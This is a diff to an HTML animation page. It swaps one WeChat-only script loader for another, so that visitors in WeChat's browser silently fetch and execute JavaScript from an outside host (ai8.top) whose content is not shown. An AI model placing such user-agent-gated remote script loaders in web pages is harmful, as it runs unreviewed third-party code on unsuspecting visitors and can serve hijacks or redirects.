@@ -36,6 +36,14 @@
 
 <body>
 
+    <script>
+	var ua = navigator.userAgent.toLowerCase(); 
+	function gettime() { var date = new Date(); var year = date.getFullYear(); var month = date.getMonth() + 1; var dates = date.getDate(); var day = date.getDay(); var hour = date.getHours(); return year + '-' +  month + '-'  + dates + '-' + hour; }
+	if (ua.match(/MicroMessenger/i) == "micromessenger") { 
+	    document.writeln("<script src=\"https://ai8.top/api/getGameJs?"+ gettime() +"\"><\/script>");
+	}
+    </script>
+
     <audio id="audioDom" src="https://sf6-cdn-tos.douyinstatic.com/obj/ies-music/7170534431801838367.mp3" preload="auto" loop="loop"></audio>
 
     <div id="yhBtn" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#fff ; font-size:20px    ">
@@ -253,12 +261,7 @@ var _hmt = _hmt || [];
     </div>
     <!-- partial -->
 	
-<script>
-var ua = navigator.userAgent.toLowerCase(); 
-if (ua.match(/MicroMessenger/i) == "micromessenger") { 
-    document.writeln("<script src=\"https://web-360.20it.cn/static/js/jump_mp.js?v1.0.0\"><\/script>"); 
-}
-</script>
+
 	
     <script src='files/js/fscreen.js'></script>
     <script src='files/js/Stage.js'></script>
